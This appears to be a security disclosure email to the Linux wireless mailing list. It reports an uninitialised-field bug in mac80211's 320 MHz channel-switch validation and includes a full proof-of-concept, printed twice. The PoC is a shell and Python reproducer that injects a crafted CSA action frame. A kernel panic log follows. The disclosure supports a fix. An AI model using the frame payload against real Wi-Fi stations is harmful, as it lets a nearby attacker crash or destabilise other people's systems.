Received: from mail-pj2-f43.google.com (mail-pj2-f43.google.com [74.125.227.171])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2733E388E72
	for <linux-wireless@vger.kernel.org>; Tue, 22 Sep 2026 18:02:48 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.171
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790100171; cv=none; b=dQbejH62KkkYDcQ+YnG7QKmsjAn+J93i/J81zCw5ZOA0t3fnNcLzllmA/6vsFLGtbGeZDbPx5yJk32Rg6FRAw/33u9Tb6pmP/BK2LyZbHB4BBETk/tzngmKu+bQie0nEs9q2Oz+5jpA8cC3ELYXnvEE4nP8x9xrzZ0hXHrBKD80=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790100171; c=relaxed/simple;
	bh=WWvCSV5xaKvqOeYYyx4Eg5Q2tu/8/y15TT+IqimbI3I=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=I5WdNebk4HB5Czy7BrdX+jWp4JzZwHe9ab+KhiNw1UTyMw5U9tLJ3XzHESYx5vu8RJnW3uurOi7PiSXD6fFDTmS8fIxivmNxffY2ZejfdKuYT6V1x6N2Vq8cudgZGa3IbfbUPaKDr0CHnID5euM7w2DmdKElF9ImiHfG202xqzs=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=CqU7GQwS; arc=none smtp.client-ip=74.125.227.171
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="CqU7GQwS"
Received: by mail-pj2-f43.google.com with SMTP id 98e67ed59e1d1-398a1676000so132099a91.2
        for <linux-wireless@vger.kernel.org>; Tue, 22 Sep 2026 11:02:48 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790100168; x=1790704968; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=R5WQ7J2IRxyXer2il7dRnjyGRPNvXa1ar2eII30gw7k=;
        b=CqU7GQwSXxuU4+H8oKeLff1r7SzpOMAPiA0VGTqCZ9T8mV0gCW1vagN9Jtm0DeqZ8I
         Mn8cLWJGkhs333Yt9DajfAJifT5zfL2xpbDsF5e7WK6okXGCDBZ4EPPyW5UbVzEjihou
         CGDqMYW+qEuC9Bb633uouiqJm9A8G+opsS3Cri8ugq/F8F77FMwjjf1A+Kz4JGPDuamj
         7RL3LVfq7fiFv8MPghsNVLawAX0J7cYa9mMft1w9nTM4D1yDgWy7P/nI1RTP079hZjBS
         +Qy4fvg8+DcQF5s8Hyzl7YAhl2XN5zDLG2NrHg4yqHsllfvbZj5HprMOv3hJSUWOFpsa
         RKLg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790100168; x=1790704968;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=R5WQ7J2IRxyXer2il7dRnjyGRPNvXa1ar2eII30gw7k=;
        b=prL4iDOVAsUVCZFB5XnvmuI5phCNk+E9y9zLyX13CwkE08nPA6glcOqrhVJIe9gBZg
         QoSQwjjJyM5BKc/oUkFaQJuGEaQfD7ry+IJrZHqYeWEEP17pC16Z8zn0nGTpwbT7utKL
         IBNODzHS1hiZwrrQrETTU8clnnNOBCD6u3urKCl90etFjIT1/8E2TqNK2iCrewEfAbxG
         GuxYuXJZN8HcjaE8TwUdDnP28zWXy0ISAL8asW3Af2kDi6T8sc7tb/bQeKOyb/DHYM4o
         2Sy7kaIBtIy7cX6Sko1f0b7zwNpVrvuWuaOTAxGVicCslRxySvyaqW6E69D7cb8fgpP8
         csYQ==
X-Gm-Message-State: AFuF++lLiOpZuYnGBD/ZhwI3rivDN4z1L6Z/AJ1Pzg2Y0JIHG0v5D/jm
	MHp54/pm78OHAQc+lH3BMQ47tcSY/Cw18QEAxDGncGuIA82ddaViiizXIlIQR5995zXZxG3hs0G
	8S+1WBzue
X-Gm-Gg: AYBFou3/sg1MSkexss68ooZF/bFAE85TxOlDOUD8faGS9b2HUSJ2ginBijLD4nmNinK
	KF1EE55fmCxo9GFiHRDsmRRBbAGPF72DRVwtPqkftFaE0P+6wbOpAVhrF9K2LBWtZ+g6wVn4atx
	fqyUXATzb8CquTnl7iXh5Sf0D5t4lkhtmpOGkxcAAHRs59pEJr3FyxhWUBCu6mFIS/kxxMlkjkl
	LMzyxFaC6QYFpO8ERcXSFQ6v9VuYnURws7FyvKMKODgUTf+QhYlmvXmb0NHAcyAWH+YNU5MaksQ
	Biu83VbMwY1d/1lu5ATRQcfteUNJ8LVLhi9aeHrXcixzi1H123q7sMWnOvKXsUWyfBiQXnSk/sE
	CNoS4Kul6GsHGMSt9sn12Lpv+B2RS+ARPcymI9IEnTgMmwds9QQdNrh8UQtBVTjvAr41OGNuP4s
	rssdLfClyqq6dF6lLsQy6NUh7K+ifhwMsFHxn4HmBefLdBo7rNAmRZHZssGjXwRKlatnbco8V72
	ivcvYaqwQ==
X-Received: by 2002:a17:90b:1fcf:b0:39e:b7:cbea with SMTP id 98e67ed59e1d1-3a07e5a0e0cmr195444a91.18.1790100167603;
        Tue, 22 Sep 2026 11:02:47 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a07d9978c4sm621117a91.0.2026.09.22.11.02.44
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 22 Sep 2026 11:02:47 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: linux-wireless@vger.kernel.org
Cc: johannes@sipsolutions.net,
	michael-cy.lee@mediatek.com,
	vega@nebusec.ai,
	caoruide123@gmail.com,
	weir@nebusec.ai
Subject: [PATCH 0/1] wifi: mac80211: reject invalid 320 MHz CSA bandwidth
Date: Wed, 23 Sep 2026 02:02:22 +0800
Message-ID: <cover.1787222001.git.vega.cover-letter@nebusec.ai>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Ruide Cao <caoruide123@gmail.com>

Hi Linux kernel maintainers,

We found an issue in net/mac80211/spectmgmt.c.

An attacker-controlled Bandwidth Indication element can set
new_chandef.width to NL80211_CHAN_WIDTH_320 on a non-6-GHz link. In
validate_chandef_by_ht_vht_oper(), the 320 MHz switch case executes
WARN_ON(1) but does not initialize vht_oper.chan_width before passing the
structure to ieee80211_chandef_vht_oper(), which reads that byte.
Action-frame elements are parsed in the highest connection mode, so this is
reachable even on a VHT connection; an EHT beacon provides another path. A
malicious AP can repeatedly trigger kernel warnings, crash systems using
panic_on_warn, and make channel-switch acceptance depend on stale stack
contents.

Privilege model: An adjacent Wi-Fi attacker that can transmit a crafted
CSA/Bandwidth Indication frame to a station associated with the relevant
BSS can reach this path. No local login or CAP_NET_ADMIN, user namespace,
or network namespace on the victim is required; a Wi-Fi-capable transmitter
is required. The `unshare -Urn` in the reproducer below is only for the
local mac80211_hwsim test harness (namespace-local setup/injection).

Reproducer:

#!/bin/sh
set -eu

need_cmd() {
	command -v "$1" >/dev/null 2>&1 || {
		echo "missing command: $1" >&2
		exit 1
	}
}

if [ "${1:-}" != "--inner" ]; then
	need_cmd unshare
	if [ "$(id -u)" -eq 0 ] && [ -w /proc/sys/kernel/panic_on_warn ]; then
		echo 1 > /proc/sys/kernel/panic_on_warn || true
	fi
	if [ ! -r /proc/sys/kernel/panic_on_warn ] ||
	   [ "$(cat /proc/sys/kernel/panic_on_warn)" != "1" ]; then
		echo "kernel.panic_on_warn must be 1 before running this PoC" >&2
		exit 1
	fi
	SELF=$(readlink -f "$0")
	exec unshare -Urn "$SELF" --inner
fi
shift

need_cmd gcc
need_cmd hostapd
need_cmd iw
need_cmd make
need_cmd pkg-config
need_cmd python3

DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$DIR"

make >/dev/null

ip link set lo up

# Custom regdomain index 3 maps to hwsim_world_regdom_custom_04, which allows
# 80 MHz operation on 5 GHz. The built-in radios in this VM boot under world
# regdom with NO_IR, so they cannot host a VHT AP on channel 36.
./hwsim_new_radio 1 3
./hwsim_new_radio 1 3

for _ in $(seq 1 20); do
	if [ -d /sys/class/net/wlan0 ] && [ -d /sys/class/net/wlan1 ]; then
		break
	fi
	sleep 1
done

if [ ! -d /sys/class/net/wlan0 ] || [ ! -d /sys/class/net/wlan1 ]; then
	echo "failed to create two hwsim radios inside the user namespace" >&2
	exit 1
fi

trap 'test -f /tmp/r7q-hostapd.pid && kill "$(cat /tmp/r7q-hostapd.pid)" 2>/dev/null || true' EXIT

cat > /tmp/r7q-hostapd.conf <<'EOF'
interface=wlan0
driver=nl80211
ssid=testvht
hw_mode=a
channel=36
wmm_enabled=1
auth_algs=1
ignore_broadcast_ssid=0
ieee80211n=1
ht_capab=[HT40+]
ieee80211ac=1
require_vht=1
vht_oper_chwidth=1
vht_oper_centr_freq_seg0_idx=42
EOF

ip link set wlan0 up
ip link set wlan1 up

hostapd -B -P /tmp/r7q-hostapd.pid /tmp/r7q-hostapd.conf
sleep 3

iw dev wlan1 connect -w testvht 5180
iw dev wlan1 link

AP=$(iw dev wlan0 info | awk '/addr/ {print $2; exit}')
STA=$(iw dev wlan1 info | awk '/addr/ {print $2; exit}')
export AP STA

iw dev wlan0 interface add mon0 type monitor
ip link set mon0 up

python3 - <<'PY'
import os
import socket
import time


def mac(text: str) -> bytes:
    return bytes.fromhex(text.replace(":", ""))


sta = mac(os.environ["STA"])
ap = mac(os.environ["AP"])

# Minimal radiotap header + 802.11 spectrum-management action frame.
# Body:
#   category = 0 (spectrum management)
#   action   = 4 (channel switch)
#   CSA IE   = switch to channel 36, count 1
#   BW Indication extension IE with EHT width=320 on a 5 GHz link
rtap = b"\x00\x00\x08\x00\x00\x00\x00\x00"
hdr = b"\xd0\x00\x00\x00" + sta + ap + ap + b"\x00\x00"
body = (
    bytes([0, 4]) +
    bytes([37, 3, 1, 36, 1]) +
    bytes([255, 5, 135, 0, 4, 42, 42])
)
pkt = rtap + hdr + body

sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
sock.bind(("mon0", 0))
for _ in range(5):
    sock.send(pkt)
    time.sleep(0.1)
print("malformed CSA action frame sent")
PY

# The kernel panics asynchronously in cfg80211/mac80211 workqueue context.
sleep 5


We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#!/bin/sh
set -eu

need_cmd() {
	command -v "$1" >/dev/null 2>&1 || {
		echo "missing command: $1" >&2
		exit 1
	}
}

if [ "${1:-}" != "--inner" ]; then
	need_cmd unshare
	if [ "$(id -u)" -eq 0 ] && [ -w /proc/sys/kernel/panic_on_warn ]; then
		echo 1 > /proc/sys/kernel/panic_on_warn || true
	fi
	if [ ! -r /proc/sys/kernel/panic_on_warn ] ||
	   [ "$(cat /proc/sys/kernel/panic_on_warn)" != "1" ]; then
		echo "kernel.panic_on_warn must be 1 before running this PoC" >&2
		exit 1
	fi
	SELF=$(readlink -f "$0")
	exec unshare -Urn "$SELF" --inner
fi
shift

need_cmd gcc
need_cmd hostapd
need_cmd iw
need_cmd make
need_cmd pkg-config
need_cmd python3

DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$DIR"

make >/dev/null

ip link set lo up

# Custom regdomain index 3 maps to hwsim_world_regdom_custom_04, which allows
# 80 MHz operation on 5 GHz. The built-in radios in this VM boot under world
# regdom with NO_IR, so they cannot host a VHT AP on channel 36.
./hwsim_new_radio 1 3
./hwsim_new_radio 1 3

for _ in $(seq 1 20); do
	if [ -d /sys/class/net/wlan0 ] && [ -d /sys/class/net/wlan1 ]; then
		break
	fi
	sleep 1
done

if [ ! -d /sys/class/net/wlan0 ] || [ ! -d /sys/class/net/wlan1 ]; then
	echo "failed to create two hwsim radios inside the user namespace" >&2
	exit 1
fi

trap 'test -f /tmp/r7q-hostapd.pid && kill "$(cat /tmp/r7q-hostapd.pid)" 2>/dev/null || true' EXIT

cat > /tmp/r7q-hostapd.conf <<'EOF'
interface=wlan0
driver=nl80211
ssid=testvht
hw_mode=a
channel=36
wmm_enabled=1
auth_algs=1
ignore_broadcast_ssid=0
ieee80211n=1
ht_capab=[HT40+]
ieee80211ac=1
require_vht=1
vht_oper_chwidth=1
vht_oper_centr_freq_seg0_idx=42
EOF

ip link set wlan0 up
ip link set wlan1 up

hostapd -B -P /tmp/r7q-hostapd.pid /tmp/r7q-hostapd.conf
sleep 3

iw dev wlan1 connect -w testvht 5180
iw dev wlan1 link

AP=$(iw dev wlan0 info | awk '/addr/ {print $2; exit}')
STA=$(iw dev wlan1 info | awk '/addr/ {print $2; exit}')
export AP STA

iw dev wlan0 interface add mon0 type monitor
ip link set mon0 up

python3 - <<'PY'
import os
import socket
import time


def mac(text: str) -> bytes:
    return bytes.fromhex(text.replace(":", ""))


sta = mac(os.environ["STA"])
ap = mac(os.environ["AP"])

# Minimal radiotap header + 802.11 spectrum-management action frame.
# Body:
#   category = 0 (spectrum management)
#   action   = 4 (channel switch)
#   CSA IE   = switch to channel 36, count 1
#   BW Indication extension IE with EHT width=320 on a 5 GHz link
rtap = b"\x00\x00\x08\x00\x00\x00\x00\x00"
hdr = b"\xd0\x00\x00\x00" + sta + ap + ap + b"\x00\x00"
body = (
    bytes([0, 4]) +
    bytes([37, 3, 1, 36, 1]) +
    bytes([255, 5, 135, 0, 4, 42, 42])
)
pkt = rtap + hdr + body

sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
sock.bind(("mon0", 0))
for _ in range(5):
    sock.send(pkt)
    time.sleep(0.1)
print("malformed CSA action frame sent")
PY

# The kernel panics asynchronously in cfg80211/mac80211 workqueue context.
sleep 5


------END PoC--------

----BEGIN crash log----

[  598.942311][  T161] Kernel panic - not syncing: kernel: panic_on_warn set ...
[  598.943617][  T161] CPU: 2 UID: 0 PID: 161 Comm: kworker/u16:4 Not tainted 6.12.95 #2
[  598.944775][  T161] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  598.946556][  T161] Workqueue: events_unbound cfg80211_wiphy_work
[  598.947477][  T161] Call Trace:
[  598.947983][  T161]  <TASK>
[  598.948487][  T161]  panic+0x533/0x610
[  598.949159][  T161]  ? __pfx_panic+0x10/0x10
[  598.949879][  T161]  ? ieee80211_parse_ch_switch_ie+0x162a/0x1d30
[  598.950801][  T161]  check_panic_on_warn+0x61/0x80
[  598.951537][  T161]  __warn+0xdf/0x2e0
[  598.952138][  T161]  ? ieee80211_parse_ch_switch_ie+0x162a/0x1d30
[  598.953040][  T161]  report_bug+0x308/0x3d0
[  598.953743][  T161]  handle_bug+0x111/0x150
[  598.954417][  T161]  exc_invalid_op+0x17/0x50
[  598.955081][  T161]  asm_exc_invalid_op+0x1a/0x20
[  598.955911][  T161] RIP: 0010:ieee80211_parse_ch_switch_ie+0x162a/0x1d30
[  598.956917][  T161] Code: ff 41 83 fc 02 b8 01 00 00 00 0f 84 8c f9 ff ff 41 83 fc 03 0f 94 c0 01 c0 e9 7e f9 ff ff 83 7c 24 50 0d 0f 85 54 02 00 00 90 <0f> 0b 90 e9 1f fd ff ff 48 89 ef 48 89 4c 24 08 e8 a1 d6 0c f8 48
[  598.960118][  T161] RSP: 0018:ffffc9000164f6a0 EFLAGS: 00010246
[  598.961322][  T161] RAX: 0000000000000000 RBX: ffff88807e2b4c00 RCX: ffffc9000164f7e8
[  598.962716][  T161] RDX: 0000000000000000 RSI: 000000000000000d RDI: 00000000004f7f90
[  598.964226][  T161] RBP: ffff88801ca966d8 R08: 0000000000000001 R09: ffffc9000164f770
[  598.965732][  T161] R10: ffffc9000164f787 R11: 1ffff1102085d361 R12: 000000000000143c
[  598.967238][  T161] R13: ffffc9000164f748 R14: ffffc9000164f9d7 R15: ffffc9000164f9b8
[  598.968946][  T161]  ? __pfx_ieee80211_parse_ch_switch_ie+0x10/0x10
[  598.970111][  T161]  ? srso_alias_return_thunk+0x5/0xfbef5
[  598.971121][  T161]  ? __pfx__ieee802_11_parse_elems_full+0x10/0x10
[  598.972088][  T161]  ? srso_alias_return_thunk+0x5/0xfbef5
[  598.972898][  T161]  ? srso_alias_return_thunk+0x5/0xfbef5
[  598.973737][  T161]  ieee80211_sta_process_chanswitch+0x28e/0x38f0
[  598.974697][  T161]  ? srso_alias_return_thunk+0x5/0xfbef5
[  598.975512][  T161]  ? __pfx_ieee80211_sta_process_chanswitch+0x10/0x10
[  598.976508][  T161]  ? __pfx_mark_lock+0x10/0x10
[  598.977247][  T161]  ? hlock_class+0x4e/0x130
[  598.977908][  T161]  ? srso_alias_return_thunk+0x5/0xfbef5
[  598.978782][  T161]  ? __lock_acquire+0x1249/0x3c40
[  598.979590][  T161]  ? srso_alias_return_thunk+0x5/0xfbef5
[  598.980398][  T161]  ? srso_alias_return_thunk+0x5/0xfbef5
[  598.981248][  T161]  ieee80211_sta_rx_queued_mgmt+0x2215/0x2e20
[  598.982140][  T161]  ? srso_alias_return_thunk+0x5/0xfbef5
[  598.982957][  T161]  ? lock_acquire.part.0+0x119/0x370
[  598.983771][  T161]  ? __pfx_ieee80211_sta_rx_queued_mgmt+0x10/0x10
[  598.984713][  T161]  ? srso_alias_return_thunk+0x5/0xfbef5
[  598.985531][  T161]  ? skb_dequeue+0x116/0x1a0
[  598.986187][  T161]  ? __pfx_lock_release+0x10/0x10
[  598.986972][  T161]  ? _raw_spin_unlock_irqrestore+0x57/0x80
[  598.987840][  T161]  ? srso_alias_return_thunk+0x5/0xfbef5
[  598.988760][  T161]  ? srso_alias_return_thunk+0x5/0xfbef5
[  598.989597][  T161]  ieee80211_iface_work+0x888/0xb70
[  598.990352][  T161]  ? rcu_is_watching+0x12/0xc0
[  598.991073][  T161]  cfg80211_wiphy_work+0x312/0x450
[  598.991882][  T161]  process_one_work+0x855/0x1ac0
[  598.992749][  T161]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  598.993823][  T161]  ? __pfx_process_one_work+0x10/0x10
[  598.994641][  T161]  ? srso_alias_return_thunk+0x5/0xfbef5
[  598.995468][  T161]  worker_thread+0x4f4/0xd60
[  598.996214][  T161]  ? __pfx_worker_thread+0x10/0x10
[  598.996939][  T161]  kthread+0x27e/0x350
[  598.997542][  T161]  ? _raw_spin_unlock_irq+0x28/0x50
[  598.998301][  T161]  ? __pfx_kthread+0x10/0x10
[  598.999083][  T161]  ret_from_fork+0x31/0x70
[  598.999741][  T161]  ? __pfx_kthread+0x10/0x10
[  599.000468][  T161]  ret_from_fork_asm+0x1a/0x30
[  599.001232][  T161]  </TASK>
[  599.002136][  T161] Kernel Offset: disabled
[  599.002862][  T161] Rebooting in 86400 seconds..


-----END crash log-----

Best regards,
Ruide Cao

Ruide Cao (1):
  wifi: mac80211: reject invalid 320 MHz CSA bandwidth

 net/mac80211/spectmgmt.c | 4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)


base-commit: 24ef02f934eeb48830cff6b739abc3c62b1d107b
-- 
2.47.3
